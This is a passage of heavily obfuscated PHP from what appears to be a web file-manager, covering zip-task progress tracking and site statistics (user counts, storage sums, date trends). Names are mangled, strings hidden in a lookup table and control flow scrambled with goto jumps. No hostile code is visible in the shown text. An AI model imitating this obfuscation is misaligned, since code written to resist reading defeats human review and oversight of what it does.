$AŠ¥ˆèŞœĞ[$C´·¦°äÕÖ[732]]; $AŠ¥ˆèŞœĞ[$C´·¦°äÕÖ[1530]] = 0.3 + 0.4 + $c‰×¹õ ø¬ * 0.3; } } } if ($AŠ¥ˆèŞœĞ[$C´·¦°äÕÖ[1530]] > 0) { $C¸Æ…ƒÁÇ‡ = timeFloat() - $AŠ¥ˆèŞœĞ[$C´·¦°äÕÖ[758]] - $AŠ¥ˆèŞœĞ[$C´·¦°äÕÖ[1533]]; $AŠ¥ˆèŞœĞ[$C´·¦°äÕÖ[1534]] = $C¸Æ…ƒÁÇ‡ * (1 - $AŠ¥ˆèŞœĞ[$C´·¦°äÕÖ[1530]]) / $AŠ¥ˆèŞœĞ[$C´·¦°äÕÖ[1530]]; } } public function addFile($A±ÛÉ±Ú³…) { goto eàÀÅ¡ÂŒ³; C«Ô…Äœ: $C‚ˆóìï§Ö[$AòÄØ†ìŠ[1571]] = $CŠ±ÙêÊ§[$AòÄØ†ìŠ[28]]; $C‚ˆóìï§Ö[$AòÄØ†ìŠ[1573]] = $CŠ±ÙêÊ§[$AòÄØ†ìŠ[88]]; $C‚ˆóìï§Ö[$AòÄØ†ìŠ[1574]] = 0; goto Bõµøˆ“; Bõµøˆ“: $C‚ˆóìï§Ö[$AòÄØ†ìŠ[1024]] = $AòÄØ†ìŠ[1590]; $C‚ˆóìï§Ö[$AòÄØ†ìŠ[1575]] = $AòÄØ†ìŠ[1095]; $C‚ˆóìï§Ö[$AòÄØ†ìŠ[732]] = $CŠ±ÙêÊ§[$AòÄØ†ìŠ[88]]; goto e“‰àìğšù; c¢Ö£ç‰²·: $this->update(); goto Dº²†äêÛ…; e“‰àìğšù: $C‚ˆóìï§Ö[$AòÄØ†ìŠ[1022]] = 1; $cµÈ‡ŒÕ¯ = 0; $C‚ˆóìï§Ö[$AòÄØ†ìŠ[1582]] = array($AòÄØ†ìŠ[1583] => $cµÈ‡ŒÕ¯ + 1, $AòÄØ†ìŠ[422] => $CŠ±ÙêÊ§[$AòÄØ†ìŠ[28]], $AòÄØ†ìŠ[86] => $CŠ±ÙêÊ§[$AòÄØ†ìŠ[86]], $AòÄØ†ìŠ[504] => $CŠ±ÙêÊ§[$AòÄØ†ìŠ[504]] ? $CŠ±ÙêÊ§[$AòÄØ†ìŠ[504]] : $CŠ±ÙêÊ§[$AòÄØ†ìŠ[86]]); goto c¢Ö£ç‰²·; eàÀÅ¡ÂŒ³: $AòÄØ†ìŠ =& $_SERVER[Ü˜]; $C‚ˆóìï§Ö =& $this->task; $CŠ±ÙêÊ§ = IO::info($A±ÛÉ±Ú³…); goto C«Ô…Äœ; Dº²†äêÛ…: } public function unzipAfter($c­Ó‡°ò”) { goto AãÔô£Ê½‹; c›ˆó¢ñŠ¯: $this->update(); self::log($e¿çÎ´—ÒÏ[1616] . json_encode(array($D‚„«Åé¨, $CËà‡¥Ã))); goto DÍØ“½À“«; f‚ó¥•îŠ: $D‚„«Åé¨[$e¿çÎ´—ÒÏ[1571]] = $e¿çÎ´—ÒÏ[33]; $D‚„«Åé¨[$e¿çÎ´—ÒÏ[1578]] = 0; $D‚„«Åé¨[$e¿çÎ´—ÒÏ[732]] = $CËà‡¥Ã[$e¿çÎ´—ÒÏ[88]]; goto c›ˆó¢ñŠ¯; FÆêŠèøŒ¡: $CËà‡¥Ã = IO::infoWithChildren($c­Ó‡°ò”); $cÂ§õ•É˜§ = 0; $D‚„«Åé¨[$e¿çÎ´—ÒÏ[1582]] = array($e¿çÎ´—ÒÏ[1583] => $cÂ§õ•É˜§ + 1, $e¿çÎ´—ÒÏ[422] => $CËà‡¥Ã[$e¿çÎ´—ÒÏ[28]], $e¿çÎ´—ÒÏ[86] => $CËà‡¥Ã[$e¿çÎ´—ÒÏ[86]], $e¿çÎ´—ÒÏ[504] => $CËà‡¥Ã[$e¿çÎ´—ÒÏ[504]] ? $CËà‡¥Ã[$e¿çÎ´—ÒÏ[504]] : $CËà‡¥Ã[$e¿çÎ´—ÒÏ[86]]); goto C´‹ÌîÑŸè; AãÔô£Ê½‹: $e¿çÎ´—ÒÏ =& $_SERVER[Ü˜]; $D‚„«Åé¨ =& $this->task; $D‚„«Åé¨[$e¿çÎ´—ÒÏ[1614]] = $e¿çÎ´—ÒÏ[117]; goto FÆêŠèøŒ¡; C´‹ÌîÑŸè: if ($CËà‡¥Ã[$e¿çÎ´—ÒÏ[29]] == $e¿çÎ´—ÒÏ[203]) { $D‚„«Åé¨[$e¿çÎ´—ÒÏ[1022]] = 1; } else { $D‚„«Åé¨[$e¿çÎ´—ÒÏ[1022]] = $CËà‡¥Ã[$e¿çÎ´—ÒÏ[91]][$e¿çÎ´—ÒÏ[89]]; } $D‚„«Åé¨[$e¿çÎ´—ÒÏ[1024]] = $e¿çÎ´—ÒÏ[33]; $D‚„«Åé¨[$e¿çÎ´—ÒÏ[1575]] = 0; goto D¤ŸïÒˆØù; D¤ŸïÒˆØù: $D‚„«Åé¨[$e¿çÎ´—ÒÏ[1037]] = 0; $D‚„«Åé¨[$e¿çÎ´—ÒÏ[1573]] = 0; $D‚„«Åé¨[$e¿çÎ´—ÒÏ[1574]] = 0; goto f‚ó¥•îŠ; DÍØ“½À“«: } public function nameParse($aèÃ¨Í‚¹©) { goto F¬µù¾Âº; BÑ¾‘ªã§: $this->update(); goto E›‘¼÷Ò; BÏ¾ÔÚµà“: $dñ¸Ù…Ä·º = get_path_this($aèÃ¨Í‚¹©); if (strstr($dñ¸Ù…Ä·º, $aÛÒ®å÷¨¯[105])) { $bÆö”Õ¸‰î[$aÛÒ®å÷¨¯[1037]] += 1; $bÆö”Õ¸‰î[$aÛÒ®å÷¨¯[1022]] += 1; } $bÆö”Õ¸‰î[$aÛÒ®å÷¨¯[1571]] = $aèÃ¨Í‚¹©; goto BÑ¾‘ªã§; F¬µù¾Âº: $aÛÒ®å÷¨¯ =& $_SERVER[Ü˜]; $bÆö”Õ¸‰î =& $this->task; if ($bÆö”Õ¸‰î[$aÛÒ®å÷¨¯[1614]] == $aÛÒ®å÷¨¯[1095]) { $bÆö”Õ¸‰î[$aÛÒ®å÷¨¯[1614]] = $aÛÒ®å÷¨¯[320]; $bÆö”Õ¸‰î[$aÛÒ®å÷¨¯[1578]] = 0; $bÆö”Õ¸‰î[$aÛÒ®å÷¨¯[732]] = 0; } goto BÏ¾ÔÚµà“; E›‘¼÷Ò: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $F‹§ŞØ‘¤ =& $_SERVER[Ü˜]; parent::startAfter(); Hook::bind($F‹§ŞØ‘¤[1617], array($this, $F‹§ŞØ‘¤[1612])); $bĞŒ„‡•™‡ =& $this->task; $bĞŒ„‡•™‡[$F‹§ŞØ‘¤[1614]] = $F‹§ŞØ‘¤[1095]; if (!$bĞŒ„‡•™‡[$F‹§ŞØ‘¤[1435]]) { $bĞŒ„‡•™‡[$F‹§ŞØ‘¤[1435]] = LNG($F‹§ŞØ‘¤[1618]); } } protected function endAfter() { $c‘‚Å¥’¯ =& $_SERVER[Ü˜]; parent::endAfter(); Hook::unbind($c‘‚Å¥’¯[1617], array($this, $c‘‚Å¥’¯[1612])); } public function updateAfter() { $eº‹…˜³©³ =& $_SERVER[Ü˜]; $CÃğ•ßÏ…© =& $this->task; if (!$CÃğ•ßÏ…©[$eº‹…˜³©³[1022]] || !$CÃğ•ßÏ…©[$eº‹…˜³©³[732]]) { return; } if ($CÃğ•ßÏ…©[$eº‹…˜³©³[1614]] == $eº‹…˜³©³[1095]) { $cÑÚİŠ¬½Ö = $CÃğ•ßÏ…©[$eº‹…˜³©³[1574]]; if ($CÃğ•ßÏ…©[$eº‹…˜³©³[1575]] != $eº‹…˜³©³[1095]) { $cÑÚİŠ¬½Ö = 0; } $EÉ°¹‰šß° = ($CÃğ•ßÏ…©[$eº‹…˜³©³[1578]] + $cÑÚİŠ¬½Ö) / $CÃğ•ßÏ…©[$eº‹…˜³©³[732]]; $CÃğ•ßÏ…©[$eº‹…˜³©³[1530]] = $EÉ°¹‰šß° * 0.3; } else { if ($CÃğ•ßÏ…©[$eº‹…˜³©³[1614]] == $eº‹…˜³©³[320]) { $EÉ°¹‰šß° = $CÃğ•ßÏ…©[$eº‹…˜³©³[1037]] / $CÃğ•ßÏ…©[$eº‹…˜³©³[1022]]; $CÃğ•ßÏ…©[$eº‹…˜³©³[1530]] = 0.3 + $EÉ°¹‰šß° * 0.5; } else { if ($CÃğ•ßÏ…©[$eº‹…˜³©³[1614]] == $eº‹…˜³©³[117]) { $EÉ°¹‰šß° = 0; if ($CÃğ•ßÏ…©[$eº‹…˜³©³[1573]]) { $EÉ°¹‰šß° = $CÃğ•ßÏ…©[$eº‹…˜³©³[1574]] / $CÃğ•ßÏ…©[$eº‹…˜³©³[1573]]; } $CÃğ•ßÏ…©[$eº‹…˜³©³[1530]] = 0.3 + 0.5 + $EÉ°¹‰šß° * 0.2; } } } if ($CÃğ•ßÏ…©[$eº‹…˜³©³[1530]] > 0) { $f¬¾ãöôÕ = timeFloat() - $CÃğ•ßÏ…©[$eº‹…˜³©³[758]] - $CÃğ•ßÏ…©[$eº‹…˜³©³[1533]]; $CÃğ•ßÏ…©[$eº‹…˜³©³[1534]] = $f¬¾ãöôÕ * (1 - $CÃğ•ßÏ…©[$eº‹…˜³©³[1530]]) / $CÃğ•ßÏ…©[$eº‹…˜³©³[1530]]; } } public function copyFileStart($D¹ÚŞ¶øÚÌ, $E–ƒœÛò‹¢, $a¶«ÆÒ¸, $C‘è¦Ä£êÓ, $e„œôµñª‰, $a÷ŞâÔ¸›ç) { $cÛÄŠ¤öÒ¤ =& $_SERVER[Ü˜]; parent::copyFileStart($D¹ÚŞ¶øÚÌ, $E–ƒœÛò‹¢, $a¶«ÆÒ¸, $C‘è¦Ä£êÓ, $e„œôµñª‰, $a÷ŞâÔ¸›ç); $föÂçˆ¯õ =& $this->task; if ($föÂçˆ¯õ[$cÛÄŠ¤öÒ¤[1614]] == $cÛÄŠ¤öÒ¤[320]) { $föÂçˆ¯õ[$cÛÄŠ¤öÒ¤[1614]] = $cÛÄŠ¤öÒ¤[117]; } $this->update(); } public function copyFileEnd($F¼îÀòÔ›â, $BÈ¡¤šÊ¬©, $eÏ¶Çò¯•Ÿ, $fêãùÖø±¡, $Cöù’Œ­—›, $EÉ‹æĞ¸œÓ) { $Fõ’ÏÈ¹­ =& $_SERVER[Ü˜]; $FäÀ£öÛÚ„ =& $this->task; $FäÀ£öÛÚ„[$Fõ’ÏÈ¹­[1574]] = $FäÀ£öÛÚ„[$Fõ’ÏÈ¹­[1573]]; $FäÀ£öÛÚ„[$Fõ’ÏÈ¹­[1578]] += $FäÀ£öÛÚ„[$Fõ’ÏÈ¹­[1573]]; $FäÀ£öÛÚ„[$Fõ’ÏÈ¹­[1575]] = $Fõ’ÏÈ¹­[33]; $this->update(); } public function nameParse($D’˜æò½í¢) { $F†Íà…Áå =& $_SERVER[Ü˜]; $c‹†å™›¦Û =& $this->task; if ($c‹†å™›¦Û[$F†Íà…Áå[1037]] < $c‹†å™›¦Û[$F†Íà…Áå[1022]]) { $cñ§»¼Û¹‚ = get_path_this($D’˜æò½í¢); if (strstr($cñ§»¼Û¹‚, $F†Íà…Áå[105])) { $c‹†å™›¦Û[$F†Íà…Áå[1037]] += 1; } } if ($c‹†å™›¦Û[$F†Íà…Áå[1614]] == $F†Íà…Áå[1095]) { $c‹†å™›¦Û[$F†Íà…Áå[1614]] = $F†Íà…Áå[320]; } $c‹†å™›¦Û[$F†Íà…Áå[1571]] = $D’˜æò½í¢; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($f£®‡†ª¶—) { $fÄíá‹Ö™Ğ =& $_SERVER[Ü˜]; $c¥½ë¬³ò¶ = array($fÄíá‹Ö™Ğ[571] => array($fÄíá‹Ö™Ğ[29] => $fÄíá‹Ö™Ğ[1619], $fÄíá‹Ö™Ğ[280] => array($fÄíá‹Ö™Ğ[232], $fÄíá‹Ö™Ğ[734], $fÄíá‹Ö™Ğ[1620], $fÄíá‹Ö™Ğ[1621])), $fÄíá‹Ö™Ğ[1622] => array($fÄíá‹Ö™Ğ[29] => $fÄíá‹Ö™Ğ[1623], $fÄíá‹Ö™Ğ[280] => array($fÄíá‹Ö™Ğ[232], $fÄíá‹Ö™Ğ[732], $fÄíá‹Ö™Ğ[1624], $fÄíá‹Ö™Ğ[1625], $fÄíá‹Ö™Ğ[1626]))); if (!isset($c¥½ë¬³ò¶[$f£®‡†ª¶—])) { return !1; } $this->optionType = $c¥½ë¬³ò¶[$f£®‡†ª¶—][$fÄíá‹Ö™Ğ[29]]; $this->field = $c¥½ë¬³ò¶[$f£®‡†ª¶—][$fÄíá‹Ö™Ğ[280]]; return !0; } public function listData($eù˜š„åèİ = false, $E¿”¼É¶ùº = "\x6d\x6f\x64\151\x66\x79\124\x69\155\145", $A¹‚¶ÕÓ‰ = false) { return parent::listData($eù˜š„åèİ, $E¿”¼É¶ùº, $A¹‚¶ÕÓ‰); } public function trendList($D¶Õ¯ùŠ¡Ü) { goto d•»Ö¬ëÅÊ; d•»Ö¬ëÅÊ: $AµÌëÚ×Ş‘ =& $_SERVER[Ü˜]; $C³š®ÚšÜ™ = $this->listData(); if ($C³š®ÚšÜ™) { $cŒ™÷”²²ä = end($C³š®ÚšÜ™); $BÑ–æ×Ë‡ = date($AµÌëÚ×Ş‘[1627], strtotime($AµÌëÚ×Ş‘[1628])); if ($cŒ™÷”²²ä[$AµÌëÚ×Ş‘[232]] == $BÑ–æ×Ë‡) { return $C³š®ÚšÜ™; } $C‡ñ´å½äÈ = strtotime($cŒ™÷”²²ä[$AµÌëÚ×Ş‘[232]]); } goto F Šğ°ñØí; F Šğ°ñØí: if (!isset($C‡ñ´å½äÈ)) { $f‚¹‡Î’Ü¶ = $D¶Õ¯ùŠ¡Ü == $AµÌëÚ×Ş‘[571] ? $AµÌëÚ×Ş‘[515] : $AµÌëÚ×Ş‘[799]; $C‡ñ´å½äÈ = Model($f‚¹‡Î’Ü¶)->min($AµÌëÚ×Ş‘[204]); } $c÷Ë•Õ–‡– = $AµÌëÚ×Ş‘[1629] . ucfirst($D¶Õ¯ùŠ¡Ü); $dº˜Ğ™£’ï = $this->dateList($C‡ñ´å½äÈ); goto E¹ÑïŒ÷°ö; E¹ÑïŒ÷°ö: foreach ($dº˜Ğ™£’ï as $BÑ–æ×Ë‡) { $this->{$c÷Ë•Õ–‡–}($BÑ–æ×Ë‡); } return $this->listData(); goto bµÇÓÃ‚¢Ô; bµÇÓÃ‚¢Ô: } private function dateList($EÊáÕ¾Øİ™) { $bƒí£ë·¯¢ =& $_SERVER[Ü˜]; $EŒ¨ÜäƒÛå = $EÊáÕ¾Øİ™; $B­²ç„‚“æ = strtotime($bƒí£ë·¯¢[1628]); $F½¸£±×ã¼ = array(); while ($EŒ¨ÜäƒÛå <= $B­²ç„‚“æ) { $F½¸£±×ã¼[] = date($bƒí£ë·¯¢[1627], $EŒ¨ÜäƒÛå); $EŒ¨ÜäƒÛå = strtotime($bƒí£ë·¯¢[1630], $EŒ¨ÜäƒÛå); } return $F½¸£±×ã¼; } public function _recordUser($FôÛîäæ‘à = '') { goto fˆ›ôÄ¥­; fˆ›ôÄ¥­: $a»ßì·îÜë =& $_SERVER[Ü˜]; $aŞôÓ¥Ò§ = strtotime(date($a»ßì·îÜë[1631], strtotime($FôÛîäæ‘à))); $BÓö±ä¾—® = strtotime(date($a»ßì·îÜë[1632], strtotime($FôÛîäæ‘à))); goto e÷à•¡Îñ; b§ô’×İÁ: $D±‡çÀµ½„ = Model($a»ßì·îÜë[515])->where($dæƒ¶‘À‘§)->count($a»ßì·îÜë[1529]); $dæƒ¶‘À‘§[$a»ßì·îÜë[29]] = $a»ßì·îÜë[1633]; $Aœñè©–Á = Model($a»ßì·îÜë[1634])->where($dæƒ¶‘À‘§)->count($a»ßì·îÜë[1635]); goto bÖÓ†ëçˆø; e÷à•¡Îñ: $dæƒ¶‘À‘§ = array($a»ßì·îÜë[204] => array($a»ßì·îÜë[971], $BÓö±ä¾—®)); $côïà…ãË¨ = Model($a»ßì·îÜë[515])->where($dæƒ¶‘À‘§)->count($a»ßì·îÜë[1529]); $dæƒ¶‘À‘§[$a»ßì·îÜë[204]] = array($a»ßì·îÜë[340], array($aŞôÓ¥Ò§, $BÓö±ä¾—®)); goto b§ô’×İÁ; bÖÓ†ëçˆø: $dòÙ½¿à¬ù = array($a»ßì·îÜë[232] => $FôÛîäæ‘à, $a»ßì·îÜë[734] => (int) $côïà…ãË¨, $a»ßì·îÜë[1620] => (int) $D±‡çÀµ½„, $a»ßì·îÜë[1621] => (int) $Aœñè©–Á); return $this->insert($dòÙ½¿à¬ù); goto b¬ÓÃôÉÔ; b¬ÓÃôÉÔ: } public function _recordStore($CßÖ´è‚Œ = '') { goto EÚÀ³½ÁÍ; DñêÁĞÁ­: $Eñ¨×²ñš = Model($b¥¡ã¦–¨©[799])->where($båÃÖš”Æ)->sum($b¥¡ã¦–¨©[88]); $A–ğáÏ©™„ = array($b¥¡ã¦–¨©[232] => $CßÖ´è‚Œ, $b¥¡ã¦–¨©[732] => (int) $eñ¦„ƒ–«‹, $b¥¡ã¦–¨©[1624] => (int) $fÁ®Ó Êê, $b¥¡ã¦–¨©[1625] => (int) $c¹›‘ˆêÍœ, $b¥¡ã¦–¨©[1626] => (int) $Eñ¨×²ñš); return $this->insert($A–ğáÏ©™„); goto BËÒÆ™ÊÃ; aÒ¦‹ÉÄ‹À: $båÃÖš”Æ[$b¥¡ã¦–¨©[413]] = 1; $c¹›‘ˆêÍœ = Model($b¥¡ã¦–¨©[799])->where($båÃÖš”Æ)->sum($b¥¡ã¦–¨©[88]); $båÃÖš”Æ[$b¥¡ã¦–¨©[413]] = 2; goto DñêÁĞÁ­; EÚÀ³½ÁÍ: $b¥¡ã¦–¨© =& $_SERVER[Ü˜]; $BíùÏÙßº = strtotime(date($b¥¡ã¦–¨©[1632], strtotime($CßÖ´è‚Œ))); $båÃÖš”Æ = array($b¥¡ã¦–¨©[204] => array($b¥¡ã¦–¨©[971], $BíùÏÙßº)); goto C¿›òãÖÚ‰; C¿›òãÖÚ‰: $fÁ®Ó Êê = Model($b¥¡ã¦–¨©[459])->where($båÃÖš”Æ)->sum($b¥¡ã¦–¨©[88]); $båÃÖš”Æ[$b¥¡ã¦–¨©[412]] = 0; $eñ¦„ƒ–«‹ = Model($b¥¡ã¦–¨©[799])->where($båÃÖš”Æ)->sum($b¥¡ã¦–¨©[88]); goto aÒ¦‹ÉÄ‹À; BËÒÆ™ÊÃ: } public function trend($dìÁµÈß–œ, $cá¬œ—á‹®) { goto D˜½¨ìæºÀ; D˜½¨ìæºÀ: $AÖ¥¿ŒÒÕ› =& $_SERVER[Ü˜]; if (!$this->init($dìÁµÈß–œ)) { return !1; } $c„ÛÄå¹¿ = $this->trendList($dìÁµÈß–œ); goto B¹§â§ªÉÕ; aéšŒØø™Ò: return $AÁöÒç¦åé; goto F§‰•­¨³ø; B¹§â§ªÉÕ: if ($c„ÛÄå¹¿ && $cá¬œ—á‹® != $AÖ¥¿ŒÒÕ›[1503]) { $CÆŒŠµ¹Ğ = $c„ÛÄå¹¿[0][$AÖ¥¿ŒÒÕ›[232]]; $aƒôî–¿•‚ = $this->validDate($cá¬œ—á‹®, $CÆŒŠµ¹Ğ); $F´µÜ…œµ­ = array(); $b´Ü¾À‘˜Ê = array_to_keyvalue($c„ÛÄå¹¿, $AÖ¥¿ŒÒÕ›[232]); foreach ($aƒôî–¿•‚ as $AŞøÂÚ²ŸÑ) { if (isset($b´Ü¾À‘˜Ê[$AŞøÂÚ²ŸÑ])) { $câ´à†Ì‹ = $b´Ü¾À‘˜Ê[$AŞøÂÚ²ŸÑ]; } else { $câ´à†Ì‹ = end($c„ÛÄå¹¿); $câ´à†Ì‹[$AÖ¥¿ŒÒÕ›[232]] = $AŞøÂÚ²ŸÑ; if ($dìÁµÈß–œ == $AÖ¥¿ŒÒÕ›[571]) { $câ´à†Ì‹[$AÖ¥¿ŒÒÕ›[1620]] = $câ´à†Ì‹[$AÖ¥¿ŒÒÕ›[1621]] = 0; } } $F´µÜ…œµ­[] = $câ´à†Ì‹; } $c„ÛÄå¹¿ = $F´µÜ…œµ­; } $bÈ‚èÈß§ = array($AÖ¥¿ŒÒÕ›[571] => array($AÖ¥¿ŒÒÕ›[734] => LNG($AÖ¥¿ŒÒÕ›[1636]), $AÖ¥¿ŒÒÕ›[1620] => LNG($AÖ¥¿ŒÒÕ›[1637]), $AÖ¥¿ŒÒÕ›[1621] => LNG($AÖ¥¿ŒÒÕ›[1638])), $AÖ¥¿ŒÒÕ›[1622] => array($AÖ¥¿ŒÒÕ›[732] => LNG($AÖ¥¿ŒÒÕ›[1639]), $AÖ¥¿ŒÒÕ›[1624] => LNG($AÖ¥¿ŒÒÕ›[1640]), $AÖ¥¿ŒÒÕ›[1625] => LNG($AÖ¥¿ŒÒÕ›[1641]), $AÖ¥¿ŒÒÕ›[1626] => LNG($AÖ¥¿ŒÒÕ›[1642]))); $eïë…ö¢Îš = array($AÖ¥¿ŒÒÕ›[571] => $AÖ¥¿ŒÒÕ›[1643], $AÖ¥¿ŒÒÕ›[1622] => $AÖ¥¿ŒÒÕ›[88]); goto FÄå¨àŸŸ; FÄå¨àŸŸ: if (empty($c„ÛÄå¹¿)) { $AŞøÂÚ²ŸÑ = date($AÖ¥¿ŒÒÕ›[1627], strtotime($AÖ¥¿ŒÒÕ›[1628])); $cé¶•…Ş©Î = array($AÖ¥¿ŒÒÕ›[232] => $AŞøÂÚ²ŸÑ); foreach ($bÈ‚èÈß§[$dìÁµÈß–œ] as $aĞéï»ùÑà => $Cê‡éÁÌœ) { $cé¶•…Ş©Î[$aĞéï»ùÑà] = 0; } $c„ÛÄå¹¿[] = $cé¶•…Ş©Î; } $AÁöÒç¦åé = array(); foreach ($c„ÛÄå¹¿ as $Cê‡éÁÌœ) { if ($dìÁµÈß–œ == $AÖ¥¿ŒÒÕ›[1622] && $Cê‡éÁÌœ[$AÖ¥¿ŒÒÕ›[1624]] > $Cê‡éÁÌœ[$AÖ¥¿ŒÒÕ›[732]]) { $Cê‡éÁÌœ[$AÖ¥¿ŒÒÕ›[1624]] = $Cê‡éÁÌœ[$AÖ¥¿ŒÒÕ›[732]]; } foreach ($bÈ‚èÈß§[$dìÁµÈß–œ] as $aĞéï»ùÑà => $d¨°Å²ˆ») { $câ´à†Ì‹ = array($AÖ¥¿ŒÒÕ›[232] => $Cê‡éÁÌœ[$AÖ¥¿ŒÒÕ›[232]], $AÖ¥¿ŒÒÕ›[1435] => $d¨°Å²ˆ»); $câ´à†Ì‹[$eïë…ö¢Îš[$dìÁµÈß–œ]] = isset($Cê‡éÁÌœ[$aĞéï»ùÑà]) ? $Cê‡éÁÌœ[$aĞéï»ùÑà] : 0; $AÁöÒç¦åé[] = $câ´à†Ì‹; } } goto aéšŒØø™Ò; F§‰•­¨³ø: } public function validDate($BÜ‹…ÎÆ¤, $a™¢’‚ã) { goto dÖ‚ïìÔçí; dçßÏôÅ³ï: switch ($BÜ‹…ÎÆ¤) { case $CªËâ—§Ÿå[1510]: $DÛµæ“½ñ = mktime(0, 0, 0, date($CªËâ—§Ÿå[1644]), date($CªËâ—§Ÿå[1254]) - date($CªËâ—§Ÿå[1316]) + 7 - 7, date($CªËâ—§Ÿå[1645])); $A¹ñÃ×ÇÜÚ = 0; do { $d®ğ¦ç“ ï = date($CªËâ—§Ÿå[1627], $DÛµæ“½ñ - 3600 * 24 * 7 * $A¹ñÃ×ÇÜÚ); $e§·¨„•‹[] = $d®ğ¦ç“ ï; $A¹ñÃ×ÇÜÚ++; } while ($a™¢’‚ã < $d®ğ¦ç“ ï); break; case $CªËâ—§Ÿå[1508]: $A¹ñÃ×ÇÜÚ = 1; do { $cªÊìäµÅ = date($CªËâ—§Ÿå[1646], strtotime("\x2d\x20{$A¹ñÃ×ÇÜÚ}\40\x6d\157\156\x74\x68\163")); $e§·¨„•‹[] = $cªÊìäµÅ; $A¹ñÃ×ÇÜÚ++; } while ($a™¢’‚ã < $cªÊìäµÅ); break; case $CªËâ—§Ÿå[1647]: $CŠÙé˜é¬ = (int) date($CªËâ—§Ÿå[1645], strtotime($a™¢’‚ã)); $B¨‰İÕÚ¨ì = (int) date($CªËâ—§Ÿå[1645]); if ($CŠÙé˜é¬ >= $B¨‰İÕÚ¨ì) { break; } for ($CŠÙé˜é¬; $CŠÙé˜é¬ < $B¨‰İÕÚ¨ì; $CŠÙé˜é¬++) { $e§·¨„•‹[] = $CŠÙé˜é¬ . $CªËâ—§Ÿå[1648]; } break; default: break; } if ($a™¢’‚ã > end($e§·¨„•‹)) { array_pop($e§·¨„•‹); } sort($e§·¨„•‹); goto f¡Øô»è»ğ; f¡Øô»è»ğ: return $e§·¨„•‹; goto dµÁÑ•§»; dÖ‚ïìÔçí: $CªËâ—§Ÿå =& $_SERVER[Ü˜]; $EŠÎ†† Éˆ = date($CªËâ—§Ÿå[1627], strtotime($CªËâ—§Ÿå[1628])); $e§·¨„•‹ = array($EŠÎ†† Éˆ); goto dçßÏôÅ³ï; dµÁÑ•§»: } public function listTable($bŒ±Ü©ÈãÃ) { $a„—Ÿ¡â“ = ucfirst($bŒ±Ü©ÈãÃ); return Model($a„—Ÿ¡â“)->listData(); } public function option($Dì›öÊÂ–š) { $eÃñÈÆ»Ú‘ = $_SERVER[Ü˜][1649] . ucfirst($Dì›öÊÂ–š); return $this->{$eÃñÈÆ»Ú‘}(); } private function optionUser() { goto B×ïÌâï‹°; b¨·Ë”­æ: if (!$C…¬½ò±) { $C…¬½ò± = 1; } $aÅÁïˆÎê = array($Fò‰‰™Ûõ‹[1651] => array($Fò‰‰™Ûõ‹[972], $BÇ˜¾ˆŸµ¿)); $C”é”å²Å§ = Model($Fò‰‰™Ûõ‹[515])->where($aÅÁïˆÎê)->count($Fò‰‰™Ûõ‹[1529]); goto fÀÅ­Ø¹‰‘; b„éÓÅ¡¢: if ($EÑ²»ä—Ãº < $BÇ˜¾ˆŸµ¿) { $EÑ²»ä—Ãº = $BÇ˜¾ˆŸµ¿; } $aÅÁïˆÎê = array($Fò‰‰™Ûõ‹[1651] => array($Fò‰‰™Ûõ‹[972], $EÑ²»ä—Ãº)); $C…¬½ò± = (int) Model($Fò‰‰™Ûõ‹[515])->where($aÅÁïˆÎê)->count($Fò‰‰™Ûõ‹[1529]); goto b¨·Ë”­æ; B×ïÌâï‹°: $Fò‰‰™Ûõ‹ =& $_SERVER[Ü˜]; $fÙ‰ïñÎŠ = Model($Fò‰‰™Ûõ‹[515])->count($Fò‰‰™Ûõ‹[1529]); $cÑÉ°Æ‰‰ = Model($Fò‰‰™Ûõ‹[515])->where($Fò‰‰™Ûõ‹[1650])->count($Fò‰‰™Ûõ‹[1529]); goto a™Ê…ëŠâè; a™Ê…ëŠâè: $Aç®ÙÊ±íÁ = intval($GLOBALS[$Fò‰‰™Ûõ‹[6]][$Fò‰‰™Ûõ‹[356]][$Fò‰‰™Ûõ‹[1489]]) / 3600; $EÑ²»ä—Ãº = strtotime("\x2d{$Aç®ÙÊ±íÁ}\40\150\157\x75\x72\x73"); $BÇ˜¾ˆŸµ¿ = strtotime(date($Fò‰‰™Ûõ‹[1631])); goto b„éÓÅ¡¢; fÀÅ­Ø¹‰‘: return array($Fò‰‰™Ûõ‹[728] => (int) $fÙ‰ïñÎŠ, $Fò‰‰™Ûõ‹[1652] => (int) ($fÙ‰ïñÎŠ - $cÑÉ°Æ‰‰), $Fò‰‰™Ûõ‹[1653] => (int) $cÑÉ°Æ‰‰, $Fò‰‰™Ûõ‹[1654] => (int) $C”é”å²Å§, $Fò‰‰™Ûõ‹[1655] => $C…¬½ò±); goto FìêÔñ¡²†; FìêÔñ¡²†: } private function optionFile() { goto bĞ¶ğšÁö; CâÍÙ‰…êô: $F…¼Ú†ğ = Model($Aïõ‡‘ó´è[799])->where($bÏŠ¯ˆÄ”Â)->sum($Aïõ‡‘ó´è[88]); $dØ——ÎŞ² = Model($Aïõ‡‘ó´è[799])->where($bÏŠ¯ˆÄ”Â)->count($Aïõ‡‘ó´è[404]); return array($Aïõ‡‘ó´è[732] => $B–•¡øíùù, $Aïõ‡‘ó´è[1624] => $c”Ãæˆ•Û, $Aïõ‡‘ó´è[1656] => $B–•¡øíùù - $c”Ãæˆ•Û, $Aïõ‡‘ó´è[1657] => (int) $F…¼Ú†ğ, $Aïõ‡‘ó´è[734] => (int) $C¸Ãöó÷¡¯, $Aïõ‡‘ó´è[1658] => (int) $dØ——ÎŞ²); goto aïÄ÷ˆÒ›¯; eïëÇ¢°Ç: $c”Ãæˆ•Û = $A§÷ì˜…ƒ•[$Aïõ‡‘ó´è[1624]]; $C¸Ãöó÷¡¯ = Model($Aïõ‡‘ó´è[799])->where(array($Aïõ‡‘ó´è[412] => 0))->count($Aïõ‡‘ó´è[404]); $bÏŠ¯ˆÄ”Â = array($Aïõ‡‘ó´è[412] => 0, $Aïõ‡‘ó´è[204] => array($Aïõ‡‘ó´è[972], strtotime(date($Aïõ‡‘ó´è[1631])))); goto CâÍÙ‰…êô; bĞ¶ğšÁö: $Aïõ‡‘ó´è =& $_SERVER[Ü˜]; $A§÷ì˜…ƒ• = $this->sourceSize(); $B–•¡øíùù = $A§÷ì˜…ƒ•[$Aïõ‡‘ó´è[88]]; goto eïëÇ¢°Ç; aïÄ÷ˆÒ›¯: } private function optionAccess() { $e¯¯–Ş‘•² =& $_SERVER[Ü˜]; return array($e¯¯–Ş‘•²[728] => $this->typeLogCnt(), $e¯¯–Ş‘•²[117] => $this->typeLogCnt($e¯¯–Ş‘•²[117]), 